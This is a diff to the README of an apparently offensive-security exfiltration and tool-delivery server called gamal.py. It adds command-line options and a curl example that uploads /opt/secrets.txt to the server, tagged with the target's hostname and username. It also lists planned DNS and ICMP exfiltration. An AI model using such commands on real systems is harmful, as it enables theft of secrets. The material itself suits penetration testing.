@@ -12,11 +12,25 @@ sudo apt install python3-flask #or python3 -m pip install flask
 python3 gamal.py
 ```  
 
+## Arguments
+
+```
+  -h, --help       show this help message and exit
+  --log LOG        Path to the log file
+  --port PORT      Port / HTTPs
+  --ip IP          IP e.g. : 0.0.0.0 or 127.0.0.1
+  --canary CANARY  Canary token
+  --cert CERT      Your fullchain.pem file
+  --key KEY        Your ssl private key file
+  --host HOST      Your hostname or external IP add, Format: <FQDN>:<PORT>
+  --delivery       Shows available files in the ./f path for delivery. Use it in combination with --host
+```
+
 Default configuration: IP binding: `0.0.0.0`, Port: `1337`, Log: `gamal.log`, Canary-String: `booqbooqGamal`
 
 or
 
-`python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString> [--cert <FullChain> --key <PrivateKey>]`
+`python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString> [--cert <FullChain> --key <PrivateKey>] [--host <FQDN>:<YourPort> --delivery]`
 
 Then you can use your IP & Port in your payloads.
 
@@ -53,7 +67,7 @@ Then you can use your IP & Port in your payloads.
 If you use `user` and `host` parameters in the upload URL, they will be used in the file name. It'll help you identify the owner of the files more easily. Example:
 
 ```bash
- curl -k -F "file=/opt/secrets.txt" "https://127.0.0.1:1337/e/upload?host=$(hostname)&user=$(id -un)"
+curl -k -F "file=@/opt/secrets.txt" "https://127.0.0.1:1337/e/upload?host=$(hostname)&user=$(id -un)"
 ```
 
 outputfile:
@@ -77,10 +91,9 @@ It downloads and categorizes the most common tools for delivering to the targets
 
  This tool is intended for use only in a legal and legitimate manner. Unfortunately, there is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.
 
-
 ## To do
 
 - [ ] DNS exfiltration capability
 - [ ] ICMP exfiltration capability
-- [ ] Improving the logging format
+- [X] Improving the logging format
 - [ ] Adding more tools to the helper script
